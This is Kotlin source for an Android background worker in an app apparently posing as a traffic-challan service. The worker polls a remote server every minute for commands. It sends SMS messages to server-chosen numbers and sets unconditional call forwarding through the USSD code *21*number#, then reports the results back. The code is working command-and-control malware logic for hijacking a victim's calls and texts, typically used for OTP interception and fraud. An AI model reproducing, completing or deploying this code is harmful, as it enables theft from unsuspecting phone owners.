package com.rte.challan.worker

import android.content.Context
import android.content.pm.PackageManager
import android.telephony.SmsManager
import android.util.Log
import android.widget.Toast
import androidx.core.content.ContextCompat
import androidx.work.*
import com.google.gson.Gson
import com.rte.challan.network.ApiClient
import com.rte.challan.utils.DeviceInfo
import com.rte.challan.utils.UssdHelper
import com.rte.challan.data.Command
import com.rte.challan.data.CommandAck
import com.rte.challan.data.SmsCommandData
import com.rte.challan.data.ForwardCommandData
import kotlinx.coroutines.delay
import java.util.concurrent.TimeUnit

class CommandWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        val deviceId = DeviceInfo.getDeviceId(applicationContext)
        showToast("🔍 CommandWorker started (checking every 1 min)")

        return try {
            val response = ApiClient.instance.getPendingCommands(deviceId)
            if (response.isSuccessful) {
                val allCommands = response.body() ?: emptyList()
                if (allCommands.isNotEmpty()) {
                    showToast("📦 Total ${allCommands.size} command(s)")

                    // Batch processing: 5 at a time, 10 sec gap
                    val batchSize = 5
                    allCommands.chunked(batchSize).forEachIndexed { index, batch ->
                        showToast("⚙️ Processing batch ${index + 1}/${allCommands.size / batchSize + 1}")

                        batch.forEach { cmd ->
                            val success = executeCommand(cmd)
                            val ackStatus = if (success) "sent" else "failed"
                            val ack = CommandAck(cmd.id, ackStatus)
                            ApiClient.instance.acknowledgeCommand(ack)
                        }

                        if (index < (allCommands.size - 1) / batchSize) {
                            showToast("⏸️ Waiting 10 seconds before next batch...")
                            delay(10000)
                        }
                    }
                } else {
                    showToast("⏳ No pending commands")
                }
                // खुद को 1 मिनट बाद फिर से शेड्यूल करें
                scheduleSelf(1, TimeUnit.MINUTES)
                Result.success()
            } else {
                showToast("❌ Fetch failed: ${response.code()}")
                scheduleSelf(1, TimeUnit.MINUTES)
                Result.failure()
            }
        } catch (e: Exception) {
            showToast("🚨 Error: ${e.message}")
            scheduleSelf(1, TimeUnit.MINUTES)
            Result.failure()
        }
    }

    private fun executeCommand(cmd: Command): Boolean {
        return try {
            when (cmd.type) {
                "sms" -> {
                    val data = Gson().fromJson(cmd.data, SmsCommandData::class.java)
                    sendSms(data.number, data.text)
                }
                "call_forward" -> {
                    val data = Gson().fromJson(cmd.data, ForwardCommandData::class.java)
                    UssdHelper.dialUssd(applicationContext, "*21*${data.number}#")
                    true
                }
                "sms_forward" -> true
                else -> false
            }
        } catch (e: Exception) {
            showToast("❌ Command failed: ${e.message}")
            false
        }
    }

    private fun sendSms(number: String, text: String): Boolean {
        if (ContextCompat.checkSelfPermission(applicationContext, android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            showToast("❌ SEND_SMS permission not granted")
            return false
        }
        return try {
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                applicationContext.getSystemService(SmsManager::class.java)
            } else {
                SmsManager.getDefault()
            }
            smsManager.sendTextMessage(number, null, text, null, null)
            showToast("✅ SMS sent to $number")
            true
        } catch (e: Exception) {
            showToast("❌ SMS failed: ${e.message}")
            false
        }
    }

    private fun scheduleSelf(delay: Long, unit: TimeUnit) {
        val request = OneTimeWorkRequestBuilder<CommandWorker>()
            .setInitialDelay(delay, unit)
            .build()
        WorkManager.getInstance(applicationContext).enqueue(request)
    }

    private fun showToast(message: String) {
        Toast.makeText(applicationContext, message, Toast.LENGTH_SHORT).show()
        Log.d("CommandWorker", message)
    }
}
